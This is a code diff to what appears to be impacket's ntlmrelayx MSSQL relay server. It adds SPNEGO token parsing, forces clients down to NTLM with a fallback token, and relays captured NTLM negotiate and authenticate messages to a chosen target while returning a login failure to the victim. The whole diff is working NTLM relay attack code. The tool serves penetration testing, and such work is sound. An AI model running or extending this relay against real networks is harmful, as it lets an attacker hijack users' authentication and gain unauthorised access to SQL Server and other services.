@@ -37,6 +37,13 @@ from impacket.examples.utils import parse_target
 from impacket.nt_errors import STATUS_SUCCESS
 from impacket.ntlm import NTLMAuthChallenge
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
+from impacket.examples.ntlmrelayx.utils.spnegoutils import (
+    NTLM_MECH,
+    build_ntlm_challenge_token,
+    build_ntlm_fallback_token,
+    get_ntlm_message_type,
+    inspect_spnego_token,
+)
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.utils import get_address
 
@@ -106,8 +113,8 @@ class MSSQLRelayServer(Thread):
             self.target = None
             self.client = None
             self.authUser = None
-            self.client_address = None
             self.tds8_mode = False
+            self.client_uses_spnego = False
             
             self.target = self.server.config.target.getTarget()
             if self.target is None:
@@ -116,8 +123,6 @@ class MSSQLRelayServer(Thread):
                 
             LOG.info("(MSSQL): Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
 
-            self.client_address = client_address[0]            
-            
             if ':' in self.target.netloc:
                 target_string,port=self.target.netloc.split(':')
                 self.target_port=int(port)
@@ -268,6 +273,34 @@ class MSSQLRelayServer(Thread):
             self.request.send(responsePacket.getData())
             
             return          
+
+        def sendSSPIToken(self, token):
+            tds_response = tds.TDSPacket()
+            tds_response['Type'] = tds.TDS_TABULAR
+            tds_response['Status'] = tds.TDS_STATUS_EOM
+            tds_response['PacketID'] = 0
+            tds_response['Data'] = struct.pack('<BH', tds.TDS_SSPI_TOKEN, len(token)) + token
+            self.request.send(tds_response.getData())
+
+        def inspectClientToken(self, token):
+            token_info = inspect_spnego_token(token)
+            client_ip = self.client_address[0]
+            if token_info.negoex_offered:
+                LOG.info("(MSSQL): NEGOEX authentication offered by client %s, currently not supported for relay" % client_ip)
+            if token_info.negoex_selected:
+                LOG.info("(MSSQL): NEGOEX selected by client %s, currently not supported for relay" % client_ip)
+            return token_info
+
+        def relayNegotiateToken(self, token):
+            # For MSSQL targets, preserve the original login parameters.
+            if self.target.scheme.upper() == "MSSQL":
+                self.client.sendNegotiate = self.sendNegotiate
+
+            self.challengeMessage = self.client.sendNegotiate(token)
+            challenge = bytes.fromhex(str(self.challengeMessage))
+            if self.client_uses_spnego:
+                challenge = build_ntlm_challenge_token(challenge)
+            self.sendSSPIToken(challenge)
           
         def handle(self):
             try:
@@ -278,7 +311,7 @@ class MSSQLRelayServer(Thread):
 
                 self.tds8_mode = False
                 if first_byte[0] == 0x16:  # TLS handshake record
-                    LOG.debug("(MSSQL): Detected TDS 8.0 (TLS) connection from %s" % self.client_address)
+                    LOG.debug("(MSSQL): Detected TDS 8.0 (TLS) connection from %s", self.client_address[0])
                     self.tds8_mode = True
                     try:
                         self.request = self.server.ssl_context.wrap_socket(
@@ -348,32 +381,50 @@ class MSSQLRelayServer(Thread):
                             LOG.debug("(MSSQL): Sending our own error response to the client")
                             self.sendLoginFailed()
                             break                        
-                        negotiateMessage = loginData["SSPI"]
-                        # For MSSQL, we change the database and target server name
-                        if (self.target.scheme.upper() == "MSSQL"):
-                            self.client.sendNegotiate = self.sendNegotiate
-                                
-                        self.challengeMessage = self.client.sendNegotiate(negotiateMessage)
-                        challenge = bytes.fromhex(str(self.challengeMessage))
+                        token_info = self.inspectClientToken(loginData["SSPI"])
+                        self.client_uses_spnego = token_info.is_spnego
+                        if token_info.negoex_selected:
+                            self.sendLoginFailed()
+                            break
+                        if token_info.is_init and (not token_info.mech_types or token_info.mech_types[0] != NTLM_MECH):
+                            self.sendSSPIToken(build_ntlm_fallback_token())
+                            continue
 
-                        tds_response = tds.TDSPacket()
-                        tds_response['Type'] = tds.TDS_TABULAR
-                        tds_response['Status'] = tds.TDS_STATUS_EOM
-                        tds_response['PacketID'] = 0
-                        # TDS_SSPI token + little-endian length + payload
-                        tds_response['Data'] = struct.pack('<BH', tds.TDS_SSPI_TOKEN, len(challenge)) + challenge
-
-                        self.request.send(tds_response.getData())
+                        negotiateMessage = token_info.inner_token
+                        if get_ntlm_message_type(negotiateMessage) != 1:
+                            LOG.error("(MSSQL): Initial SSPI token is not an NTLM negotiate message")
+                            self.sendLoginFailed()
+                            break
+                        self.relayNegotiateToken(negotiateMessage)
                         
                     elif packet["Type"] == tds.TDS_SSPI:    # NTLM authentication
+                        token_info = self.inspectClientToken(packet["Data"])
+                        if token_info.negoex_selected:
+                            self.sendLoginFailed()
+                            break
+                        if token_info.is_init and (not token_info.mech_types or token_info.mech_types[0] != NTLM_MECH):
+                            self.sendSSPIToken(build_ntlm_fallback_token())
+                            continue
+
+                        authToken = token_info.inner_token
+                        messageType = get_ntlm_message_type(authToken)
+                        if messageType == 1:
+                            self.client_uses_spnego = self.client_uses_spnego or token_info.is_spnego
+                            self.relayNegotiateToken(authToken)
+                            continue
+                        if messageType != 3:
+                            LOG.error("(MSSQL): SSPI token is not an NTLM authenticate message")
+                            self.sendLoginFailed()
+                            break
+
                         LOG.debug("(MSSQL): Sending our own error response to the client")
                         self.sendLoginFailed()
                         
                         authenticateMessage = ntlm.NTLMAuthChallengeResponse()
-                        authenticateMessage.fromString(packet["Data"])
+                        authenticateMessage.fromString(authToken)
                         LOG.debug("(MSSQL): Relaying authentication to server")
                         
-                        if not STATUS_SUCCESS in self.client.sendAuth(packet["Data"]):
+                        if not STATUS_SUCCESS in self.client.sendAuth(authToken):
                             if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                                 LOG.error("(MSSQL): Authenticating against %s://%s as %s/%s FAILED" % (
                                     self.target.scheme, self.target.netloc,
